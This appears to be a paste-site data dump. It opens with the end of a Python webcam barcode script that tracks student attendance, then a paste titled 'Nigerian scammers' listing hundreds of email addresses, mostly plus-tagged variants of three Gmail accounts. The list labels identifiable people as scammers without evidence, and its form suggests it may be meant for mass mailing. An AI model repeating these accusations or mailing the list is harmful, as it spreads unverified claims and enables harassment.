cap = cv2.VideoCapture(0)
cap.set(3,640)
cap.set(4,480)
def diff(start,end,secs):
    end_time = datetime.strptime(end,'%H:%M:%S')
    start_time = datetime.strptime(start,'%H:%M:%S')
    diff = min(end_time - start_time, start_time - end_time)
    return abs(diff) >= timedelta(seconds=secs)
while True:
    success, img = cap.read()
    
    for barcode in decode(img):
        student = barcode.data.decode('utf-8')
        if(student in active_people.keys()):
            student_exit_time =datetime.now().strftime('%H:%M:%S')
            if(diff(active_people[student],student_exit_time,30)):
                print(student,""joined at"" ,active_people[student], "" and left at "" , student_exit_time )
                last_student = student
                last_student_exit =student_exit_time
                active_people.pop(student)
        else :
            if(student == last_student):
                if(diff(last_student_exit, datetime.now().strftime('%H:%M:%S'),30)):
                    active_people[student]=datetime.now().strftime('%H:%M:%S')
            else:
                active_people[student]=datetime.now().strftime('%H:%M:%S')
        print(""Current Students :"",active_people)

    cv2.imshow('Result',img)
    cv2.waitKey(50)
"
6DagYt4Z,Nigerian scammers [24-11-1/2023],bombaires,AIMMS,Friday 24th of November 2023 01:36:06 AM CDT,"<a href=""mailto:jamespeter600011@gkmail.com"">jamespeter600011@gkmail.com</a>
<a href=""mailto:comunicados@mercosoft.com"">comunicados@mercosoft.com</a>
<a href=""mailto:angelo.rossin@cemesparts.com"">angelo.rossin@cemesparts.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya@gmail.com"">manuelndiakondiakothedeliverya@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+4945@gmail.com"">manuelndiakondiakothedeliverya+4945@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+29061@gmail.com"">manuelndiakondiakothedeliverya+29061@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+9015@gmail.com"">manuelndiakondiakothedeliverya+9015@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+3503@gmail.com"">manuelndiakondiakothedeliverya+3503@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+30696@gmail.com"">manuelndiakondiakothedeliverya+30696@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+30234@gmail.com"">manuelndiakondiakothedeliverya+30234@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+19039@gmail.com"">manuelndiakondiakothedeliverya+19039@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+26504@gmail.com"">manuelndiakondiakothedeliverya+26504@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+19344@gmail.com"">manuelndiakondiakothedeliverya+19344@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+11117@gmail.com"">manuelndiakondiakothedeliverya+11117@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+17822@gmail.com"">manuelndiakondiakothedeliverya+17822@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+27813@gmail.com"">manuelndiakondiakothedeliverya+27813@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+27456@gmail.com"">manuelndiakondiakothedeliverya+27456@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+8109@gmail.com"">manuelndiakondiakothedeliverya+8109@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+7920@gmail.com"">manuelndiakondiakothedeliverya+7920@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+13297@gmail.com"">manuelndiakondiakothedeliverya+13297@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+5243@gmail.com"">manuelndiakondiakothedeliverya+5243@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+22246@gmail.com"">manuelndiakondiakothedeliverya+22246@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+15268@gmail.com"">manuelndiakondiakothedeliverya+15268@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+12628@gmail.com"">manuelndiakondiakothedeliverya+12628@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+18763@gmail.com"">manuelndiakondiakothedeliverya+18763@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+22942@gmail.com"">manuelndiakondiakothedeliverya+22942@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+27334@gmail.com"">manuelndiakondiakothedeliverya+27334@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+15167@gmail.com"">manuelndiakondiakothedeliverya+15167@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+4574@gmail.com"">manuelndiakondiakothedeliverya+4574@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+9847@gmail.com"">manuelndiakondiakothedeliverya+9847@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+30808@gmail.com"">manuelndiakondiakothedeliverya+30808@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+24629@gmail.com"">manuelndiakondiakothedeliverya+24629@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+9491@gmail.com"">manuelndiakondiakothedeliverya+9491@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+10123@gmail.com"">manuelndiakondiakothedeliverya+10123@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+7588@gmail.com"">manuelndiakondiakothedeliverya+7588@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+4841@gmail.com"">manuelndiakondiakothedeliverya+4841@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+11911@gmail.com"">manuelndiakondiakothedeliverya+11911@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+20272@gmail.com"">manuelndiakondiakothedeliverya+20272@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+31077@gmail.com"">manuelndiakondiakothedeliverya+31077@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+18607@gmail.com"">manuelndiakondiakothedeliverya+18607@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+8057@gmail.com"">manuelndiakondiakothedeliverya+8057@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+9565@gmail.com"">manuelndiakondiakothedeliverya+9565@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+20107@gmail.com"">manuelndiakondiakothedeliverya+20107@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+21230@gmail.com"">manuelndiakondiakothedeliverya+21230@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+5228@gmail.com"">manuelndiakondiakothedeliverya+5228@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+30654@gmail.com"">manuelndiakondiakothedeliverya+30654@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+6190@gmail.com"">manuelndiakondiakothedeliverya+6190@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+184@gmail.com"">manuelndiakondiakothedeliverya+184@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+23210@gmail.com"">manuelndiakondiakothedeliverya+23210@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+18455@gmail.com"">manuelndiakondiakothedeliverya+18455@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+21414@gmail.com"">manuelndiakondiakothedeliverya+21414@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+13066@gmail.com"">manuelndiakondiakothedeliverya+13066@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+16565@gmail.com"">manuelndiakondiakothedeliverya+16565@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+6131@gmail.com"">manuelndiakondiakothedeliverya+6131@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+28301@gmail.com"">manuelndiakondiakothedeliverya+28301@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+32333@gmail.com"">manuelndiakondiakothedeliverya+32333@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+23049@gmail.com"">manuelndiakondiakothedeliverya+23049@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+31911@gmail.com"">manuelndiakondiakothedeliverya+31911@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+23734@gmail.com"">manuelndiakondiakothedeliverya+23734@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+3376@gmail.com"">manuelndiakondiakothedeliverya+3376@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+5876@gmail.com"">manuelndiakondiakothedeliverya+5876@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+7521@gmail.com"">manuelndiakondiakothedeliverya+7521@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+3033@gmail.com"">manuelndiakondiakothedeliverya+3033@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+5427@gmail.com"">manuelndiakondiakothedeliverya+5427@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+23169@gmail.com"">manuelndiakondiakothedeliverya+23169@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+21140@gmail.com"">manuelndiakondiakothedeliverya+21140@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+28259@gmail.com"">manuelndiakondiakothedeliverya+28259@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+4432@gmail.com"">manuelndiakondiakothedeliverya+4432@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+25409@gmail.com"">manuelndiakondiakothedeliverya+25409@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+12702@gmail.com"">manuelndiakondiakothedeliverya+12702@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+18813@gmail.com"">manuelndiakondiakothedeliverya+18813@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+14458@gmail.com"">manuelndiakondiakothedeliverya+14458@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+17836@gmail.com"">manuelndiakondiakothedeliverya+17836@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+1806@gmail.com"">manuelndiakondiakothedeliverya+1806@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+30949@gmail.com"">manuelndiakondiakothedeliverya+30949@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+22698@gmail.com"">manuelndiakondiakothedeliverya+22698@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+1163@gmail.com"">manuelndiakondiakothedeliverya+1163@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+15709@gmail.com"">manuelndiakondiakothedeliverya+15709@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+2119@gmail.com"">manuelndiakondiakothedeliverya+2119@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+7722@gmail.com"">manuelndiakondiakothedeliverya+7722@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+31957@gmail.com"">manuelndiakondiakothedeliverya+31957@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+7986@gmail.com"">manuelndiakondiakothedeliverya+7986@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+854@gmail.com"">manuelndiakondiakothedeliverya+854@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+7387@gmail.com"">manuelndiakondiakothedeliverya+7387@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+26182@gmail.com"">manuelndiakondiakothedeliverya+26182@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+1387@gmail.com"">manuelndiakondiakothedeliverya+1387@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+4258@gmail.com"">manuelndiakondiakothedeliverya+4258@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+32359@gmail.com"">manuelndiakondiakothedeliverya+32359@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+5766@gmail.com"">manuelndiakondiakothedeliverya+5766@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+25219@gmail.com"">manuelndiakondiakothedeliverya+25219@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+27763@gmail.com"">manuelndiakondiakothedeliverya+27763@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+10531@gmail.com"">manuelndiakondiakothedeliverya+10531@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+20477@gmail.com"">manuelndiakondiakothedeliverya+20477@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+6200@gmail.com"">manuelndiakondiakothedeliverya+6200@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+12710@gmail.com"">manuelndiakondiakothedeliverya+12710@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+30712@gmail.com"">manuelndiakondiakothedeliverya+30712@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+28639@gmail.com"">manuelndiakondiakothedeliverya+28639@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+12901@gmail.com"">manuelndiakondiakothedeliverya+12901@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+374@gmail.com"">manuelndiakondiakothedeliverya+374@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+2275@gmail.com"">manuelndiakondiakothedeliverya+2275@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+25585@gmail.com"">manuelndiakondiakothedeliverya+25585@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+13383@gmail.com"">manuelndiakondiakothedeliverya+13383@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+27929@gmail.com"">manuelndiakondiakothedeliverya+27929@gmail.com</a>
<a href=""mailto:manuelndiakondiakothedeliverya+25378@gmail.com"">manuelndiakondiakothedeliverya+25378@gmail.com</a>
<a href=""mailto:jamespeter600011@gmail.com"">jamespeter600011@gmail.com</a>
<a href=""mailto:jamespeter600011+23987@gmail.com"">jamespeter600011+23987@gmail.com</a>
<a href=""mailto:jamespeter600011+12258@gmail.com"">jamespeter600011+12258@gmail.com</a>
<a href=""mailto:jamespeter600011+25711@gmail.com"">jamespeter600011+25711@gmail.com</a>
<a href=""mailto:jamespeter600011+20368@gmail.com"">jamespeter600011+20368@gmail.com</a>
<a href=""mailto:jamespeter600011+25634@gmail.com"">jamespeter600011+25634@gmail.com</a>
<a href=""mailto:jamespeter600011+7153@gmail.com"">jamespeter600011+7153@gmail.com</a>
<a href=""mailto:jamespeter600011+1545@gmail.com"">jamespeter600011+1545@gmail.com</a>
<a href=""mailto:jamespeter600011+11861@gmail.com"">jamespeter600011+11861@gmail.com</a>
<a href=""mailto:jamespeter600011+23505@gmail.com"">jamespeter600011+23505@gmail.com</a>
<a href=""mailto:jamespeter600011+25786@gmail.com"">jamespeter600011+25786@gmail.com</a>
<a href=""mailto:jamespeter600011+28320@gmail.com"">jamespeter600011+28320@gmail.com</a>
<a href=""mailto:jamespeter600011+24215@gmail.com"">jamespeter600011+24215@gmail.com</a>
<a href=""mailto:jamespeter600011+9815@gmail.com"">jamespeter600011+9815@gmail.com</a>
<a href=""mailto:jamespeter600011+17794@gmail.com"">jamespeter600011+17794@gmail.com</a>
<a href=""mailto:jamespeter600011+27997@gmail.com"">jamespeter600011+27997@gmail.com</a>
<a href=""mailto:jamespeter600011+2493@gmail.com"">jamespeter600011+2493@gmail.com</a>
<a href=""mailto:jamespeter600011+13962@gmail.com"">jamespeter600011+13962@gmail.com</a>
<a href=""mailto:jamespeter600011+19023@gmail.com"">jamespeter600011+19023@gmail.com</a>
<a href=""mailto:jamespeter600011+5683@gmail.com"">jamespeter600011+5683@gmail.com</a>
<a href=""mailto:jamespeter600011+25174@gmail.com"">jamespeter600011+25174@gmail.com</a>
<a href=""mailto:jamespeter600011+20048@gmail.com"">jamespeter600011+20048@gmail.com</a>
<a href=""mailto:jamespeter600011+21018@gmail.com"">jamespeter600011+21018@gmail.com</a>
<a href=""mailto:jamespeter600011+24095@gmail.com"">jamespeter600011+24095@gmail.com</a>
<a href=""mailto:jamespeter600011+6609@gmail.com"">jamespeter600011+6609@gmail.com</a>
<a href=""mailto:jamespeter600011+13615@gmail.com"">jamespeter600011+13615@gmail.com</a>
<a href=""mailto:jamespeter600011+23567@gmail.com"">jamespeter600011+23567@gmail.com</a>
<a href=""mailto:jamespeter600011+2083@gmail.com"">jamespeter600011+2083@gmail.com</a>
<a href=""mailto:jamespeter600011+18371@gmail.com"">jamespeter600011+18371@gmail.com</a>
<a href=""mailto:jamespeter600011+29226@gmail.com"">jamespeter600011+29226@gmail.com</a>
<a href=""mailto:jamespeter600011+24045@gmail.com"">jamespeter600011+24045@gmail.com</a>
<a href=""mailto:jamespeter600011+28854@gmail.com"">jamespeter600011+28854@gmail.com</a>
<a href=""mailto:jamespeter600011+26972@gmail.com"">jamespeter600011+26972@gmail.com</a>
<a href=""mailto:jamespeter600011+30206@gmail.com"">jamespeter600011+30206@gmail.com</a>
<a href=""mailto:jamespeter600011+22862@gmail.com"">jamespeter600011+22862@gmail.com</a>
<a href=""mailto:jamespeter600011+13078@gmail.com"">jamespeter600011+13078@gmail.com</a>
<a href=""mailto:jamespeter600011+4831@gmail.com"">jamespeter600011+4831@gmail.com</a>
<a href=""mailto:jamespeter600011+17686@gmail.com"">jamespeter600011+17686@gmail.com</a>
<a href=""mailto:jamespeter600011+3536@gmail.com"">jamespeter600011+3536@gmail.com</a>
<a href=""mailto:jamespeter600011+32681@gmail.com"">jamespeter600011+32681@gmail.com</a>
<a href=""mailto:jamespeter600011+8813@gmail.com"">jamespeter600011+8813@gmail.com</a>
<a href=""mailto:jamespeter600011+27989@gmail.com"">jamespeter600011+27989@gmail.com</a>
<a href=""mailto:jamespeter600011+12745@gmail.com"">jamespeter600011+12745@gmail.com</a>
<a href=""mailto:jamespeter600011+7646@gmail.com"">jamespeter600011+7646@gmail.com</a>
<a href=""mailto:jamespeter600011+8667@gmail.com"">jamespeter600011+8667@gmail.com</a>
<a href=""mailto:jamespeter600011+4072@gmail.com"">jamespeter600011+4072@gmail.com</a>
<a href=""mailto:jamespeter600011+6522@gmail.com"">jamespeter600011+6522@gmail.com</a>
<a href=""mailto:jamespeter600011+20572@gmail.com"">jamespeter600011+20572@gmail.com</a>
<a href=""mailto:jamespeter600011+21964@gmail.com"">jamespeter600011+21964@gmail.com</a>
<a href=""mailto:jamespeter600011+19143@gmail.com"">jamespeter600011+19143@gmail.com</a>
<a href=""mailto:jamespeter600011+8485@gmail.com"">jamespeter600011+8485@gmail.com</a>
<a href=""mailto:jamespeter600011+16249@gmail.com"">jamespeter600011+16249@gmail.com</a>
<a href=""mailto:jamespeter600011+30445@gmail.com"">jamespeter600011+30445@gmail.com</a>
<a href=""mailto:jamespeter600011+15482@gmail.com"">jamespeter600011+15482@gmail.com</a>
<a href=""mailto:jamespeter600011+933@gmail.com"">jamespeter600011+933@gmail.com</a>
<a href=""mailto:jamespeter600011+6679@gmail.com"">jamespeter600011+6679@gmail.com</a>
<a href=""mailto:jamespeter600011+11066@gmail.com"">jamespeter600011+11066@gmail.com</a>
<a href=""mailto:jamespeter600011+12747@gmail.com"">jamespeter600011+12747@gmail.com</a>
<a href=""mailto:jamespeter600011+10368@gmail.com"">jamespeter600011+10368@gmail.com</a>
<a href=""mailto:jamespeter600011+25638@gmail.com"">jamespeter600011+25638@gmail.com</a>
<a href=""mailto:jamespeter600011+31185@gmail.com"">jamespeter600011+31185@gmail.com</a>
<a href=""mailto:jamespeter600011+31555@gmail.com"">jamespeter600011+31555@gmail.com</a>
<a href=""mailto:jamespeter600011+28707@gmail.com"">jamespeter600011+28707@gmail.com</a>
<a href=""mailto:jamespeter600011+784@gmail.com"">jamespeter600011+784@gmail.com</a>
<a href=""mailto:jamespeter600011+25870@gmail.com"">jamespeter600011+25870@gmail.com</a>
<a href=""mailto:jamespeter600011+23976@gmail.com"">jamespeter600011+23976@gmail.com</a>
<a href=""mailto:jamespeter600011+4827@gmail.com"">jamespeter600011+4827@gmail.com</a>
<a href=""mailto:jamespeter600011+14049@gmail.com"">jamespeter600011+14049@gmail.com</a>
<a href=""mailto:jamespeter600011+26648@gmail.com"">jamespeter600011+26648@gmail.com</a>
<a href=""mailto:jamespeter600011+1647@gmail.com"">jamespeter600011+1647@gmail.com</a>
<a href=""mailto:jamespeter600011+19930@gmail.com"">jamespeter600011+19930@gmail.com</a>
<a href=""mailto:jamespeter600011+26015@gmail.com"">jamespeter600011+26015@gmail.com</a>
<a href=""mailto:jamespeter600011+25366@gmail.com"">jamespeter600011+25366@gmail.com</a>
<a href=""mailto:jamespeter600011+27648@gmail.com"">jamespeter600011+27648@gmail.com</a>
<a href=""mailto:jamespeter600011+25607@gmail.com"">jamespeter600011+25607@gmail.com</a>
<a href=""mailto:jamespeter600011+16427@gmail.com"">jamespeter600011+16427@gmail.com</a>
<a href=""mailto:jamespeter600011+32491@gmail.com"">jamespeter600011+32491@gmail.com</a>
<a href=""mailto:jamespeter600011+27655@gmail.com"">jamespeter600011+27655@gmail.com</a>
<a href=""mailto:jamespeter600011+13254@gmail.com"">jamespeter600011+13254@gmail.com</a>
<a href=""mailto:jamespeter600011+25513@gmail.com"">jamespeter600011+25513@gmail.com</a>
<a href=""mailto:jamespeter600011+5184@gmail.com"">jamespeter600011+5184@gmail.com</a>
<a href=""mailto:jamespeter600011+10237@gmail.com"">jamespeter600011+10237@gmail.com</a>
<a href=""mailto:jamespeter600011+12128@gmail.com"">jamespeter600011+12128@gmail.com</a>
<a href=""mailto:jamespeter600011+5693@gmail.com"">jamespeter600011+5693@gmail.com</a>
<a href=""mailto:jamespeter600011+7848@gmail.com"">jamespeter600011+7848@gmail.com</a>
<a href=""mailto:jamespeter600011+29373@gmail.com"">jamespeter600011+29373@gmail.com</a>
<a href=""mailto:jamespeter600011+22964@gmail.com"">jamespeter600011+22964@gmail.com</a>
<a href=""mailto:jamespeter600011+27820@gmail.com"">jamespeter600011+27820@gmail.com</a>
<a href=""mailto:jamespeter600011+28328@gmail.com"">jamespeter600011+28328@gmail.com</a>
<a href=""mailto:jamespeter600011+17204@gmail.com"">jamespeter600011+17204@gmail.com</a>
<a href=""mailto:jamespeter600011+32078@gmail.com"">jamespeter600011+32078@gmail.com</a>
<a href=""mailto:jamespeter600011+7271@gmail.com"">jamespeter600011+7271@gmail.com</a>
<a href=""mailto:jamespeter600011+18450@gmail.com"">jamespeter600011+18450@gmail.com</a>
<a href=""mailto:jamespeter600011+23092@gmail.com"">jamespeter600011+23092@gmail.com</a>
<a href=""mailto:jamespeter600011+11717@gmail.com"">jamespeter600011+11717@gmail.com</a>
<a href=""mailto:jamespeter600011+20005@gmail.com"">jamespeter600011+20005@gmail.com</a>
<a href=""mailto:jamespeter600011+15417@gmail.com"">jamespeter600011+15417@gmail.com</a>
<a href=""mailto:jamespeter600011+18279@gmail.com"">jamespeter600011+18279@gmail.com</a>
<a href=""mailto:jamespeter600011+31408@gmail.com"">jamespeter600011+31408@gmail.com</a>
<a href=""mailto:jamespeter600011+15234@gmail.com"">jamespeter600011+15234@gmail.com</a>
<a href=""mailto:jamespeter600011+8632@gmail.com"">jamespeter600011+8632@gmail.com</a>
<a href=""mailto:handsonrichardson@yahoo.com"">handsonrichardson@yahoo.com</a>
<a href=""mailto:ibrahimhonhassan79@gmail.com"">ibrahimhonhassan79@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+5721@gmail.com"">ibrahimhonhassan79+5721@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+17450@gmail.com"">ibrahimhonhassan79+17450@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+14805@gmail.com"">ibrahimhonhassan79+14805@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+32615@gmail.com"">ibrahimhonhassan79+32615@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+335@gmail.com"">ibrahimhonhassan79+335@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+15163@gmail.com"">ibrahimhonhassan79+15163@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+23128@gmail.com"">ibrahimhonhassan79+23128@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+30901@gmail.com"">ibrahimhonhassan79+30901@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+12224@gmail.com"">ibrahimhonhassan79+12224@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+22930@gmail.com"">ibrahimhonhassan79+22930@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+9385@gmail.com"">ibrahimhonhassan79+9385@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+2079@gmail.com"">ibrahimhonhassan79+2079@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+15381@gmail.com"">ibrahimhonhassan79+15381@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+9345@gmail.com"">ibrahimhonhassan79+9345@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+27034@gmail.com"">ibrahimhonhassan79+27034@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+8830@gmail.com"">ibrahimhonhassan79+8830@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+25115@gmail.com"">ibrahimhonhassan79+25115@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+16163@gmail.com"">ibrahimhonhassan79+16163@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+15159@gmail.com"">ibrahimhonhassan79+15159@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+2676@gmail.com"">ibrahimhonhassan79+2676@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+27499@gmail.com"">ibrahimhonhassan79+27499@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+19848@gmail.com"">ibrahimhonhassan79+19848@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+31210@gmail.com"">ibrahimhonhassan79+31210@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+24332@gmail.com"">ibrahimhonhassan79+24332@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+26508@gmail.com"">ibrahimhonhassan79+26508@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+23054@gmail.com"">ibrahimhonhassan79+23054@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+25417@gmail.com"">ibrahimhonhassan79+25417@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+8571@gmail.com"">ibrahimhonhassan79+8571@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+21224@gmail.com"">ibrahimhonhassan79+21224@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+30248@gmail.com"">ibrahimhonhassan79+30248@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+7517@gmail.com"">ibrahimhonhassan79+7517@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+24094@gmail.com"">ibrahimhonhassan79+24094@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+20423@gmail.com"">ibrahimhonhassan79+20423@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+12672@gmail.com"">ibrahimhonhassan79+12672@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+32682@gmail.com"">ibrahimhonhassan79+32682@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+16228@gmail.com"">ibrahimhonhassan79+16228@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+4497@gmail.com"">ibrahimhonhassan79+4497@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+3638@gmail.com"">ibrahimhonhassan79+3638@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+2194@gmail.com"">ibrahimhonhassan79+2194@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+8981@gmail.com"">ibrahimhonhassan79+8981@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+29707@gmail.com"">ibrahimhonhassan79+29707@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+9906@gmail.com"">ibrahimhonhassan79+9906@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+8236@gmail.com"">ibrahimhonhassan79+8236@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+11510@gmail.com"">ibrahimhonhassan79+11510@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+1572@gmail.com"">ibrahimhonhassan79+1572@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+7277@gmail.com"">ibrahimhonhassan79+7277@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+22835@gmail.com"">ibrahimhonhassan79+22835@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+27848@gmail.com"">ibrahimhonhassan79+27848@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+6425@gmail.com"">ibrahimhonhassan79+6425@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+6288@gmail.com"">ibrahimhonhassan79+6288@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+30030@gmail.com"">ibrahimhonhassan79+30030@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+5100@gmail.com"">ibrahimhonhassan79+5100@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+22950@gmail.com"">ibrahimhonhassan79+22950@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+28817@gmail.com"">ibrahimhonhassan79+28817@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+21705@gmail.com"">ibrahimhonhassan79+21705@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+15464@gmail.com"">ibrahimhonhassan79+15464@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+7678@gmail.com"">ibrahimhonhassan79+7678@gmail.com</a>
